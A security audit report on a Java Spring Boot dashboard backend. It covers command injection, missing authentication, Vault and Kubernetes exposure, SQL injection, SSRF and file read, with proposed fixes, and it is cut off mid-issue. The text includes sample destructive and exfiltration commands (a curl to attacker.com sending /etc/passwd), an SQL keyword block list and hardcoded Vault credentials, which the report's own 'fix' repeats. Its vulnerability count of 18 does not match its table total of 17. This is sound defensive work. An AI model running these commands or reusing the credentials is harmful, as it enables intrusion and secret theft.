# Security Audit Report - Service Dashboard Backend (Java)

**Project:** `com.antigravity:service-dashboard-backend`
**Framework:** Spring Boot 3.3.0, Java 17
**Audit Date:** 2026-02-09
**Files Reviewed:** 66 Java source files, pom.xml, application.properties
**Root Path:** service-dashboard/backend-java/

---

## Executive Summary

The Service Dashboard backend Java project contains **18 security vulnerabilities** across
all severity levels. The most critical findings are the complete absence of authentication/
authorization and an OS command injection vulnerability, which together allow any anonymous
network user to execute arbitrary commands on the server. Additional critical issues include
unauthenticated access to HashiCorp Vault secrets and Kubernetes pod shells.

| Severity | Count |
|----------|-------|
| CRITICAL | 5     |
| HIGH     | 4     |
| MEDIUM   | 4     |
| LOW      | 4     |
| **Total**| **17**|

---

## CRITICAL Severity Issues

### ISSUE #1: OS Command Injection via ShellService

**File:** service/ShellService.java:29-44
**CVSS Estimate:** 9.8 (Critical)
**OWASP Category:** A03:2021 - Injection

**Description:**
The `executeCommand(String command, String cwd)` method takes an arbitrary string and passes
it directly to `sh -c` (Linux) or `powershell.exe -EncodedCommand` (Windows) with zero
sanitization or allowlisting. This is called from SyncService.java:177 when a data source
has type `LOCAL_COMMAND`, meaning any user who can create/configure a data source or task can
execute arbitrary OS commands on the server.

**Attack Vector:**
Create a DataSource with `type=LOCAL_COMMAND`, set `fetchQuery` to any shell command
(e.g., `rm -rf /`, `net user attacker /add`, `curl attacker.com/exfil?data=$(cat /etc/passwd)`).

**Current Vulnerable Code:**
```java
public List<Map<String, Object>> executeCommand(String command, String cwd) {
    logger.info("Executing Shell Command: {}", command);
    // ...
    if (isWindows) {
        String encodedCmd = Base64.getEncoder().encodeToString(
            command.getBytes(StandardCharsets.UTF_16LE));
        builder.command("powershell.exe", "-EncodedCommand", encodedCmd);
    } else {
        builder.command("sh", "-c", command);
    }
    // ...
}
```

**Recommended Fix:**
```java
package com.antigravity.servicedashboard.service;

import com.fasterxml.jackson.core.type.TypeReference;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Service;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.*;
import java.util.concurrent.TimeUnit;

@Service
public class ShellService {

    private static final Logger logger = LoggerFactory.getLogger(ShellService.class);
    private final ObjectMapper objectMapper;

    // Allowlist of permitted commands
    private static final Set<String> ALLOWED_COMMANDS = Set.of(
            "kubectl", "docker", "az", "aws", "gcloud",
            "systemctl", "journalctl", "df", "free", "uptime"
    );

    // Characters that must never appear in command arguments
    private static final String DANGEROUS_CHARS = ";|&$`><!(){}\\\"'";

    public ShellService(ObjectMapper objectMapper) {
        this.objectMapper = objectMapper;
    }

    public List<Map<String, Object>> executeCommand(String command, String cwd) {
        validateCommand(command);
        logger.info("Executing approved command: {}", command);
        List<String> outputLines = new ArrayList<>();

        try {
            // Use argument array instead of shell interpretation
            List<String> cmdParts = parseCommandParts(command);
            ProcessBuilder builder = new ProcessBuilder(cmdParts);

            builder.environment().clear();
            builder.environment().put("PATH", System.getenv("PATH"));

            if (cwd != null && !cwd.isEmpty()) {
                java.io.File dir = new java.io.File(cwd);
                if (!dir.isDirectory()) {
                    throw new SecurityException("Invalid working directory: " + cwd);
                }
                builder.directory(dir);
            }

            builder.redirectErrorStream(true);
            Process process = builder.start();

            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    outputLines.add(line);
                }
            }

            boolean finished = process.waitFor(30, TimeUnit.SECONDS);
            if (!finished) {
                process.destroyForcibly();
                throw new RuntimeException("Command timed out");
            }

            if (process.exitValue() != 0) {
                throw new RuntimeException(
                    "Command exited with code " + process.exitValue());
            }

            return parseOutput(outputLines);

        } catch (SecurityException e) {
            throw e;
        } catch (Exception e) {
            logger.error("Shell Execution Failed", e);
            throw new RuntimeException("Command execution failed", e);
        }
    }

    private void validateCommand(String command) {
        if (command == null || command.isBlank()) {
            throw new SecurityException("Command cannot be empty");
        }

        String baseCommand = command.trim().split("\\s+")[0];
        if (baseCommand.contains("/")) {
            baseCommand = baseCommand.substring(baseCommand.lastIndexOf('/') + 1);
        }
        if (baseCommand.contains("\\")) {
            baseCommand = baseCommand.substring(baseCommand.lastIndexOf('\\') + 1);
        }

        if (!ALLOWED_COMMANDS.contains(baseCommand.toLowerCase())) {
            throw new SecurityException(
                "Command not allowed: " + baseCommand +
                ". Allowed: " + ALLOWED_COMMANDS);
        }

        for (char c : DANGEROUS_CHARS.toCharArray()) {
            if (command.indexOf(c) >= 0) {
                throw new SecurityException(
                    "Command contains forbidden character: " + c);
            }
        }
    }

    private List<String> parseCommandParts(String command) {
        return Arrays.asList(command.trim().split("\\s+"));
    }

    private List<Map<String, Object>> parseOutput(List<String> lines) {
        String fullOutput = String.join("\n", lines).trim();
        if (fullOutput.isEmpty()) {
            return Collections.emptyList();
        }
        if (fullOutput.startsWith("[") || fullOutput.startsWith("{")) {
            try {
                if (fullOutput.startsWith("[")) {
                    return objectMapper.readValue(fullOutput,
                        new TypeReference<List<Map<String, Object>>>() {});
                } else {
                    Map<String, Object> obj = objectMapper.readValue(fullOutput,
                        new TypeReference<Map<String, Object>>() {});
                    return Collections.singletonList(obj);
                }
            } catch (Exception e) {
                logger.warn("Output looked like JSON but failed to parse");
            }
        }
        List<Map<String, Object>> result = new ArrayList<>();
        for (String line : lines) {
            result.add(Collections.singletonMap("output", line));
        }
        return result;
    }
}
```

---

### ISSUE #2: No Authentication or Authorization - Entire API is Open

**Files:** All controllers (UserController, VaultController, DataSourceController,
AutomationController, K8sController, etc.)
**CVSS Estimate:** 9.8 (Critical)
**OWASP Category:** A01:2021 - Broken Access Control

**Description:**
There is no Spring Security dependency, no authentication filter, no JWT/session validation,
no @PreAuthorize, no role-based access control. Every endpoint is accessible to anyone who
can reach the server, including:
- /api/vault/secret/{path} - reads arbitrary secrets from HashiCorp Vault
- /api/automation/execute - executes ad-hoc tasks (which can trigger shell commands)
- /api/k8s/config - saves Kubernetes credentials
- /api/k8s/pods - lists Kubernetes pods
- /api/users - manages all users and roles
- /api/data-sources - creates data sources (including LOCAL_COMMAND type)

**Recommended Fix:**

Step A - Add dependencies to pom.xml:
```xml
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-security</artifactId>
</dependency>
<dependency>
    <groupId>io.jsonwebtoken</groupId>
    <artifactId>jjwt-api</artifactId>
    <version>0.12.5</version>
</dependency>
<dependency>
    <groupId>io.jsonwebtoken</groupId>
    <artifactId>jjwt-impl</artifactId>
    <version>0.12.5</version>
    <scope>runtime</scope>
</dependency>
<dependency>
    <groupId>io.jsonwebtoken</groupId>
    <artifactId>jjwt-jackson</artifactId>
    <version>0.12.5</version>
    <scope>runtime</scope>
</dependency>
```

Step B - New file config/JwtUtil.java:
```java
package com.antigravity.servicedashboard.config;

import io.jsonwebtoken.Claims;
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.security.Keys;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Component;

import javax.crypto.SecretKey;
import java.nio.charset.StandardCharsets;
import java.util.Date;

@Component
public class JwtUtil {

    private final SecretKey key;
    private final long expirationMs;

    public JwtUtil(
            @Value("${jwt.secret}") String secret,
            @Value("${jwt.expiration-ms:3600000}") long expirationMs) {
        this.key = Keys.hmacShaKeyFor(secret.getBytes(StandardCharsets.UTF_8));
        this.expirationMs = expirationMs;
    }

    public String generateToken(String username, String role) {
        return Jwts.builder()
                .subject(username)
                .claim("role", role)
                .issuedAt(new Date())
                .expiration(new Date(System.currentTimeMillis() + expirationMs))
                .signWith(key)
                .compact();
    }

    public Claims parseToken(String token) {
        return Jwts.parser()
                .verifyWith(key)
                .build()
                .parseSignedClaims(token)
                .getPayload();
    }

    public String getUsername(String token) {
        return parseToken(token).getSubject();
    }

    public String getRole(String token) {
        return parseToken(token).get("role", String.class);
    }

    public boolean isValid(String token) {
        try {
            parseToken(token);
            return true;
        } catch (Exception e) {
            return false;
        }
    }
}
```

Step C - New file config/JwtAuthFilter.java:
```java
package com.antigravity.servicedashboard.config;

import jakarta.servlet.FilterChain;
import jakarta.servlet.ServletException;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.stereotype.Component;
import org.springframework.web.filter.OncePerRequestFilter;

import java.io.IOException;
import java.util.List;

@Component
public class JwtAuthFilter extends OncePerRequestFilter {

    private final JwtUtil jwtUtil;

    public JwtAuthFilter(JwtUtil jwtUtil) {
        this.jwtUtil = jwtUtil;
    }

    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                    HttpServletResponse response,
                                    FilterChain filterChain)
            throws ServletException, IOException {

        String header = request.getHeader("Authorization");

        if (header != null && header.startsWith("Bearer ")) {
            String token = header.substring(7);
            if (jwtUtil.isValid(token)) {
                String username = jwtUtil.getUsername(token);
                String role = jwtUtil.getRole(token);

                UsernamePasswordAuthenticationToken auth =
                    new UsernamePasswordAuthenticationToken(
                        username, null,
                        List.of(new SimpleGrantedAuthority("ROLE_" + role))
                    );
                SecurityContextHolder.getContext().setAuthentication(auth);
            }
        }

        filterChain.doFilter(request, response);
    }
}
```

Step D - New file config/SecurityConfig.java:
```java
package com.antigravity.servicedashboard.config;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.method.configuration.EnableMethodSecurity;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.http.SessionCreationPolicy;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.security.web.SecurityFilterChain;
import org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter;

@Configuration
@EnableWebSecurity
@EnableMethodSecurity
public class SecurityConfig {

    private final JwtAuthFilter jwtAuthFilter;

    public SecurityConfig(JwtAuthFilter jwtAuthFilter) {
        this.jwtAuthFilter = jwtAuthFilter;
    }

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf.disable())
            .sessionManagement(sm ->
                sm.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/auth/login").permitAll()
                .requestMatchers("/actuator/health").permitAll()
                .requestMatchers("/api/vault/**").hasRole("ADMIN")
                .requestMatchers("/api/k8s/**").hasRole("ADMIN")
                .requestMatchers("/api/automation/**").hasRole("ADMIN")
                .requestMatchers("/api/data-sources/**").hasRole("ADMIN")
                .requestMatchers("/api/users").hasRole("ADMIN")
                .requestMatchers("/h2-console/**").hasRole("ADMIN")
                .requestMatchers("/actuator/**").hasRole("ADMIN")
                .anyRequest().authenticated()
            )
            .addFilterBefore(jwtAuthFilter,
                UsernamePasswordAuthenticationFilter.class);

        http.headers(headers -> headers.frameOptions(fo -> fo.sameOrigin()));

        return http.build();
    }

    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }
}
```

Step E - Add to application.properties:
```properties
jwt.secret=${JWT_SECRET:change-this-to-a-32-char-or-longer-random-secret-key!!}
jwt.expiration-ms=3600000
```

---

### ISSUE #3: Unauthenticated Vault Secret Exposure

**File:** controller/VaultController.java:23-44
**CVSS Estimate:** 9.1 (Critical)
**OWASP Category:** A01:2021 - Broken Access Control

**Description:**
The GET /api/vault/secret/{path} endpoint allows reading any secret from HashiCorp Vault
by path, with no authentication. The full secret values (including passwords, API keys,
tokens) are returned in the HTTP response body as plaintext JSON.

**Current Vulnerable Code:**
```java
@GetMapping("/secret/{*path}")
public ResponseEntity<?> getSecret(
        @PathVariable String path,
        @RequestParam(required = false) String key) {
    // No auth check, returns raw secret values
    Map<String, Object> secret = vaultService.getSecret(path);
    return ResponseEntity.ok(secret);
}
```

**Recommended Fix:**
```java
package com.antigravity.servicedashboard.controller;

import com.antigravity.servicedashboard.service.VaultService;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.http.ResponseEntity;
import org.springframework.security.access.prepost.PreAuthorize;
import org.springframework.security.core.Authentication;
import org.springframework.web.bind.annotation.*;

import java.util.HashMap;
import java.util.Map;

@RestController
@RequestMapping("/api/vault")
@PreAuthorize("hasRole('ADMIN')")
public class VaultController {

    private static final Logger logger = LoggerFactory.getLogger(
        VaultController.class);
    private final VaultService vaultService;

    public VaultController(VaultService vaultService) {
        this.vaultService = vaultService;
    }

    @GetMapping("/secret/{*path}")
    public ResponseEntity<?> getSecret(
            @PathVariable String path,
            @RequestParam(required = false) String key,
            Authentication authentication) {
        try {
            logger.warn("AUDIT: Secret access by user='{}' path='{}' key='{}'",
                    authentication.getName(), path, key);

            if (key != null && !key.isEmpty()) {
                String value = vaultService.getSecretValue(path, key);
                if (value == null) {
                    return ResponseEntity.status(404)
                        .body(Map.of("error", "Key not found"));
                }
                Map<String, String> response = new HashMap<>();
                response.put("key", key);
                response.put("value", maskValue(value));
                response.put("note",
                    "Value is masked. Use Vault CLI for full access.");
                return ResponseEntity.ok(response);
            } else {
                Map<String, Object> secret = vaultService.getSecret(path);
                Map<String, Object> masked = new HashMap<>();
                secret.forEach((k, v) ->
                    masked.put(k, maskValue(String.valueOf(v))));
                return ResponseEntity.ok(masked);
            }
        } catch (Exception e) {
            logger.error("Vault access failed for path: {}", path);
            return ResponseEntity.status(500)
                .body(Map.of("error", "Failed to retrieve secret"));
        }
    }

    @GetMapping("/health")
    public ResponseEntity<?> health() {
        Map<String, Object> response = new HashMap<>();
        boolean healthy = vaultService.isHealthy();
        response.put("vault", healthy ? "UP" : "DOWN");
        response.put("status", healthy ? 200 : 503);
        return ResponseEntity.status(healthy ? 200 : 503).body(response);
    }

    private String maskValue(String value) {
        if (value == null || value.length() <= 4) return "****";
        return value.substring(0, 2) + "****"
            + value.substring(value.length() - 2);
    }
}
```

---

### ISSUE #4: Hardcoded Vault Credentials in Source

**File:** application.properties:9-10
**CVSS Estimate:** 8.6 (Critical)
**OWASP Category:** A07:2021 - Identification and Authentication Failures

**Description:**
Vault AppRole role-id and secret-id are hardcoded in plaintext in application.properties.
If this file is committed to version control, these credentials are permanently exposed.

**Current Vulnerable Code:**
```properties
spring.cloud.vault.app-role.role-id=67c35e10-0f2a-3ad3-9eb6-354d8472eb0c
spring.cloud.vault.app-role.secret-id=154c3620-6679-020d-1f4d-b9b7f95bfb25
```

**Recommended Fix (application.properties):**
```properties
# Spring Cloud Vault Configuration
spring.config.import=vault://
spring.cloud.vault.enabled=true
spring.cloud.vault.uri=${VAULT_URI:https://localhost:8200}
spring.cloud.vault.authentication=approle
spring.cloud.vault.app-role.role-id=${VAULT_ROLE_ID}
spring.cloud.vault.app-role.secret-id=${VAULT_SECRET_ID}
```

Set environment variables at deploy time:
```bash
export VAULT_ROLE_ID=67c35e10-0f2a-3ad3-9eb6-354d8472eb0c
export VAULT_SECRET_ID=154c3620-6679-020d-1f4d-b9b7f95bfb25
export VAULT_URI=https://vault.internal:8200
```

---

### ISSUE #5: Unauthenticated Kubernetes Exec Shell (WebSocket)

**Files:** k8s/K8sExecHandler.java:70-104, k8s/K8sWebSocketConfig.java:20-22
**CVSS Estimate:** 9.8 (Critical)
**OWASP Category:** A01:2021 - Broken Access Control

**Description:**
The WebSocket endpoint /ws/k8s/exec provides an interactive shell into Kubernetes pods with:
- No authentication on the WebSocket connection
- setAllowedOrigins("*") allowing any origin
- User-supplied command parameter (defaults to /bin/sh) with no validation
- User-supplied namespace, pod, container with no validation

**Current Vulnerable Code:**
```java
// K8sWebSocketConfig.java
registry.addHandler(execHandler, "/ws/k8s/exec")
        .setAllowedOrigins("*");

// K8sExecHandler.java - no auth, no command validation
String command = params.getOrDefault("command", "/bin/sh");
Process proc = exec.exec(namespace, pod, new String[] { command },
    container, true, true);
```

**Recommended Fix:**

New file k8s/K8sWebSocketAuthInterceptor.java:
```java
package com.antigravity.servicedashboard.k8s;

import com.antigravity.servicedashboard.config.JwtUtil;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.http.server.ServerHttpRequest;
import org.springframework.http.server.ServerHttpResponse;
import org.springframework.http.server.ServletServerHttpRequest;
import org.springframework.stereotype.Component;
import org.springframework.web.socket.WebSocketHandler;
import org.springframework.web.socket.server.HandshakeInterceptor;

import java.util.Map;

@Component
public class K8sWebSocketAuthInterceptor implements HandshakeInterceptor {

    private static final Logger logger = LoggerFactory.getLogger(
        K8sWebSocketAuthInterceptor.class);
    private final JwtUtil jwtUtil;

    public K8sWebSocketAuthInterceptor(JwtUtil jwtUtil) {
        this.jwtUtil = jwtUtil;
    }

    @Override
    public boolean beforeHandshake(ServerHttpRequest request,
                                   ServerHttpResponse response,
                                   WebSocketHandler wsHandler,
                                   Map<String, Object> attributes) {
        if (request instanceof ServletServerHttpRequest servletRequest) {
            String token = servletRequest.getServletRequest()
                .getParameter("token");

            if (token == null || !jwtUtil.isValid(token)) {
                logger.warn("WebSocket auth rejected: invalid or missing token");
                return false;
            }

            String role = jwtUtil.getRole(token);
            if (!"ADMIN".equalsIgnoreCase(role)) {
                logger.warn("WebSocket auth rejected: user '{}' is not ADMIN",
                    jwtUtil.getUsername(token));
                return false;
            }

            attributes.put("username", jwtUtil.getUsername(token));
            logger.info("WebSocket auth approved for user: {}",
                jwtUtil.getUsername(token));
            return true;
        }
        return false;
    }

    @Override
    public void afterHandshake(ServerHttpRequest request,
                               ServerHttpResponse response,
                               WebSocketHandler wsHandler,
                               Exception exception) {
    }
}
```

Fixed K8sWebSocketConfig.java:
```java
package com.antigravity.servicedashboard.k8s;

import org.springframework.beans.factory.annotation.Value;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.socket.config.annotation.EnableWebSocket;
import org.springframework.web.socket.config.annotation.WebSocketConfigurer;
import org.springframework.web.socket.config.annotation.WebSocketHandlerRegistry;

@Configuration
@EnableWebSocket
public class K8sWebSocketConfig implements WebSocketConfigurer {

    private final K8sExecHandler execHandler;
    private final K8sWebSocketAuthInterceptor authInterceptor;

    @Value("${app.cors.allowed-origins:http://localhost:4200}")
    private String allowedOrigins;

    public K8sWebSocketConfig(K8sExecHandler execHandler,
                              K8sWebSocketAuthInterceptor authInterceptor) {
        this.execHandler = execHandler;
        this.authInterceptor = authInterceptor;
    }

    @Override
    public void registerWebSocketHandlers(WebSocketHandlerRegistry registry) {
        registry.addHandler(execHandler, "/ws/k8s/exec")
                .addInterceptors(authInterceptor)
                .setAllowedOrigins(allowedOrigins.split(","));
    }
}
```

Add command validation in K8sExecHandler.afterConnectionEstablished():
```java
private static final Set<String> ALLOWED_SHELLS = Set.of(
        "/bin/sh", "/bin/bash", "sh", "bash"
);

@Override
public void afterConnectionEstablished(WebSocketSession session)
        throws Exception {
    String query = session.getUri().getQuery();
    Map<String, String> params = parseQuery(query);

    String namespace = params.getOrDefault("namespace", "default");
    String pod = params.get("pod");
    String container = params.get("container");
    String command = params.getOrDefault("command", "/bin/sh");

    if (pod == null || pod.isBlank()) {
        session.close(CloseStatus.BAD_DATA);
        return;
    }

    // Validate command against allowlist
    if (!ALLOWED_SHELLS.contains(command)) {
        logger.warn("Rejected disallowed command '{}' for pod {}/{}",
            command, namespace, pod);
        session.sendMessage(new TextMessage("Error: Command not allowed"));
        session.close(CloseStatus.BAD_DATA);
        return;
    }

    // Validate namespace and pod name format
    if (!namespace.matches("^[a-zA-Z0-9-]+$") ||
        !pod.matches("^[a-zA-Z0-9-]+$")) {
        session.close(CloseStatus.BAD_DATA);
        return;
    }

    // ... rest of existing connection logic
}
```

---

## HIGH Severity Issues

### ISSUE #6: SQL Injection via globalFilter and Multi-Metric Conditions

**Files:** service/TableService.java:55-63, service/TableService.java:149-158
**CVSS Estimate:** 8.6 (High)
**OWASP Category:** A03:2021 - Injection

**Description:**
The globalFilter from queryConfig and the condition field from metric configurations are
concatenated directly into SQL queries without parameterization. If an attacker can control
the queryConfig of a WidgetDefinition (which they can via unauthenticated endpoints), they
can inject arbitrary SQL.

**Current Vulnerable Code:**
```java
// Line 55-63
sql.append(" WHERE (").append(globalFilter).append(")");

// Line 149-158
target = "CASE WHEN " + cond + " THEN 1 ELSE NULL END";
```

**Recommended Fix - Add validation method to TableService.java:**
```java
private void validateSqlFilter(String filter) {
    if (filter == null) return;

    String upper = filter.toUpperCase().replaceAll("\\s+", " ");

    List<String> blockedKeywords = List.of(
        "DROP ", "DELETE ", "INSERT ", "UPDATE ", "ALTER ",
        "CREATE ", "EXEC ", "EXECUTE ", "UNION ", "INTO ",
        "--", "/*", "*/", "xp_", "sp_",
        "SLEEP(", "BENCHMARK(", "WAITFOR ",
        "LOAD_FILE", "OUTFILE", "DUMPFILE"
    );

    for (String keyword : blockedKeywords) {
        if (upper.contains(keyword)) {
            throw new IllegalArgumentException(
                "Forbidden keyword in filter: " + keyword.trim());
        }
    }

    // Allowlist expected filter grammar characters
    String sanitized = filter.replaceAll(
        "(?i)(datetime|date|count|sum|avg|min|max|case|when|then|else|end"
        + "|and|or|not|is|null|like|in|between|now|start of day)"
        + "|'[^']*'"
        + "|[\\w.]+"
        + "|[(),:?]"
        + "|[><!=]+"
        + "|[+\\-*/]"
        + "|\\s+", ""
    );

    if (!sanitized.isEmpty()) {
        throw new IllegalArgumentException(
            "Filter contains invalid characters: " + sanitized);
    }
}
```

Apply validation before use in fetchWidgetData() and fetchMultiMetricData():
```java
// Before appending globalFilter:
validateSqlFilter(globalFilter);

// Before using condition in multi-metric:
if (!Set.of("COUNT", "SUM", "AVG", "MIN", "MAX").contains(op)) {
    throw new IllegalArgumentException("Invalid operation: " + op);
}
if (cond != null && !cond.isBlank()) {
    validateSqlFilter(cond);
    // ... then proceed with CASE WHEN
}
```

---

### ISSUE #7: Server-Side Request Forgery (SSRF) via REST Data Sources

**Files:** service/RestClientService.java:36-51, service/SyncService.java:207-261
**CVSS Estimate:** 8.6 (High)
**OWASP Category:** A10:2021 - Server-Side Request Forgery

**Description:**
When a data source has type REST_API, the fetchQuery is used as a URL with no validation.
An attacker can scan internal networks, access cloud metadata endpoints, or exfiltrate data.

**Recommended Fix - New file util/UrlValidator.java:**
```java
package com.antigravity.servicedashboard.util;

import java.net.InetAddress;
import java.net.URI;
import java.util.Set;

public class UrlValidator {

    private static final Set<String> ALLOWED_SCHEMES = Set.of("http", "https");

    public static void validateExternalUrl(String urlString) {
        if (urlString == null || urlString.isBlank()) {
            throw new SecurityException("URL cannot be empty");
        }

        try {
            URI uri = new URI(urlString);
            String scheme = uri.getScheme();

            if (scheme == null ||
                    !ALLOWED_SCHEMES.contains(scheme.toLowerCase())) {
                throw new SecurityException(
                    "Only HTTP/HTTPS schemes allowed. Got: " + scheme);
            }

            String host = uri.getHost();
            if (host == null || host.isBlank()) {
                throw new SecurityException("URL must have a valid host");
            }

            InetAddress addr = InetAddress.getByName(host);

            if (addr.isLoopbackAddress()) {
                throw new SecurityException(
                    "Requests to loopback addresses are blocked");
            }
            if (addr.isLinkLocalAddress()) {
                throw new SecurityException(
                    "Requests to link-local addresses are blocked");
            }
            if (addr.isSiteLocalAddress()) {
                throw new SecurityException(
                    "Requests to private network addresses are blocked");
            }
            if (addr.isAnyLocalAddress()) {
                throw new SecurityException(
                    "Requests to wildcard addresses are blocked");
            }

            if (host.equals("169.254.169.254") ||
                host.equals("metadata.google.internal") ||
                host.endsWith(".internal")) {
                throw new SecurityException(
                    "Requests to cloud metadata endpoints are blocked");
            }

        } catch (SecurityException e) {
            throw e;
        } catch (Exception e) {
            throw new SecurityException("Invalid URL: " + e.getMessage());
        }
    }
}
```

Apply in SyncService.fetchFromRestApi() before making the HTTP call:
```java
// After constructing the URL, before calling restClient.fetchData():
UrlValidator.validateExternalUrl(url);
```

---

### ISSUE #8: Arbitrary File Read via File Data Sources

**File:** service/FileService.java:21-46
**CVSS Estimate:** 7.5 (High)
**OWASP Category:** A01:2021 - Broken Access Control

**Description:**
FileService.readFile() accepts an arbitrary filePath and reads any file the server process
has access to. Combined with unauthenticated data source API, an attacker can read sensitive
server files.

**Recommended Fix:**
```java
package com.antigravity.servicedashboard.service;

import com.antigravity.servicedashboard.constant.AppConstants;
import com.fasterxml.jackson.core.type.TypeReference;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Service;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.*;

@Service
public class FileService {

    private static final Logger logger = LoggerFactory.getLogger(
        FileService.class);
    private final ObjectMapper mapper = new ObjectMapper();

    @Value("${app.file-source.base-dir:./data/files}")
    private String baseDir;

    private static final long MAX_FILE_SIZE = 10 * 1024 * 1024; // 10 MB

    public List<Map<String, Object>> readFile(String filePath, String format)
            throws IOException {
        File file = resolveAndValidatePath(filePath);

        if (file.length() > MAX_FILE_SIZE) {
            throw new IOException("File exceeds maximum allowed size of "
                + (MAX_FILE_SIZE / 1024 / 1024) + " MB");
        }

        String determinedFormat = format;
        if (format == null ||
                AppConstants.FORMAT_AUTO.equalsIgnoreCase(format)) {
            String name = file.getName().toLowerCase();
            if (name.endsWith(".json"))
                determinedFormat = AppConstants.FORMAT_JSON;
            else if (name.endsWith(".csv"))
                determinedFormat = AppConstants.FORMAT_CSV;
            else
                determinedFormat = AppConstants.FORMAT_TEXT;
        }

        if (AppConstants.FORMAT_JSON.equalsIgnoreCase(determinedFormat)) {
            return parseJson(file);
        } else if (AppConstants.FORMAT_CSV.equalsIgnoreCase(determinedFormat)) {
            return parseCsv(file);
        } else {
            return parseText(file);
        }
    }

    private File resolveAndValidatePath(String filePath) throws IOException {
        if (filePath == null || filePath.isBlank()) {
            throw new IOException("File path cannot be empty");
        }

        File baseDirectory = new File(baseDir).getCanonicalFile();
        if (!baseDirectory.isDirectory()) {
            throw new IOException(
                "Base directory not configured or does not exist");
        }

        File requestedFile = new File(baseDirectory, filePath)
            .getCanonicalFile();

        // Prevent path traversal
        if (!requestedFile.getPath()
                .startsWith(baseDirectory.getPath())) {
            logger.warn("Path traversal attempt blocked: {}", filePath);
            throw new SecurityException(
                "Access denied: path outside allowed directory");
        }

        if (!requestedFile.exists() || !requestedFile.isFile()) {
            throw new IOException("File not found: " + filePath);
        }

        // Block symlinks pointing outside base dir
        if (Files.isSymbolicLink(requestedFile.toPath())) {
            Path realPath = requestedFile.toPath().toRealPath();
            if (!realPath.startsWith(baseDirectory.toPath())) {
                throw new SecurityException(
                    "Symlink target outside allowed directory");
            }
        }

        return requestedFile;
    }

    // parseJson, parseCsv, parseText methods remain unchanged
    private List<Map<String, Object>> parseJson(File file) throws IOException {
        try {
            return mapper.readValue(file,
                new TypeReference<List<Map<String, Object>>>() {});
        } catch (Exception e) {
            List<Map<String, Object>> result = new ArrayList<>();
            List<String> lines = Files.readAllLines(file.toPath());
            for (String line : lines) {
                if (line.trim().isEmpty()) continue;
                try {
                    Map<String, Object> row = mapper.readValue(line,
                        new TypeReference<Map<String, Object>>() {});
                    result.add(row);
                } catch (Exception ex) {
                    throw new IOException("Invalid JSON format in file", ex);
                }
            }
            return result;
        }
    }

    private List<Map<String, Object>> parseCsv(File file) throws IOException {
        List<Map<String, Object>> result = new ArrayList<>();
        try (BufferedReader br = new BufferedReader(new FileReader(file))) {
            String headerLine = br.readLine();
            if (headerLine == null) return result;
            String[] headers = headerLine.split(",");
            for (int i = 0; i < headers.length; i++) {
                headers[i] = headers[i].trim().replaceAll("^\"|\"$", "");
            }
            String line;
            while ((line = br.readLine()) != null) {
                if (line.trim().isEmpty()) continue;
                String[] values = line.split(
                    ",(?=(?:[^\"]*\"[^\"]*\")*[^\"]*$)");
                Map<String, Object> row = new LinkedHashMap<>();
                for (int i = 0; i < headers.length; i++) {
                    String val = (i < values.length)
                        ? values[i].trim().replaceAll("^\"|\"$", "") : null;
                    row.put(headers[i], val);
                }
                result.add(row);
            }
        }
        return result;
    }

    private List<Map<String, Object>> parseText(File file) throws IOException {
        List<Map<String, Object>> result = new ArrayList<>();
        List<String> lines = Files.readAllLines(file.toPath());
        for (int i = 0; i < lines.size(); i++) {
            result.add(Map.of("line", i + 1, "content", lines.get(i)));
        }
        return result;
    }
}
```

Add to application.properties:
```properties
app.file-source.base-dir=./data/files
```

---

### ISSUE #9: Unauthenticated K8s Credential Storage

**File:** k8s/K8sController.java:18-22
**CVSS Estimate:** 8.1 (High)
**OWASP Category:** A01:2021 - Broken Access Control

**Description:**
POST /api/k8s/config accepts K8s configuration from any unauthenticated request and stores
it in the database. An attacker could overwrite the K8s config or read arbitrary files.

**Recommended Fix:**
```java
package com.antigravity.servicedashboard.k8s;

import org.springframework.security.access.prepost.PreAuthorize;
import org.springframework.web.bind.annotation.*;

import java.util.List;
import java.util.Map;

@RestController
@RequestMapping("/api/k8s")
@PreAuthorize("hasRole('ADMIN')")
public class K8sController {

    private final K8sService service;

    public K8sController(K8sService service) {
        this.service = service;
    }

    @PostMapping("/config")
    public void saveConfig(@RequestBody Map<String, String> payload) {
        String type = payload.get("type");
        String value = payload.get("value");

        if (type == null || (!type.equalsIgnoreCase("FILE")
                && !type.equalsIgnoreCase("TOKEN"))) {
            throw new IllegalArgumentException(
                "Invalid config type. Must be FILE or TOKEN");
        }

        if ("FILE".equalsIgnoreCase(type)) {
            java.io.File configFile = new java.io.File(value);
            if (!configFile.exists() || !configFile.isFile()) {
                throw new IllegalArgumentException(
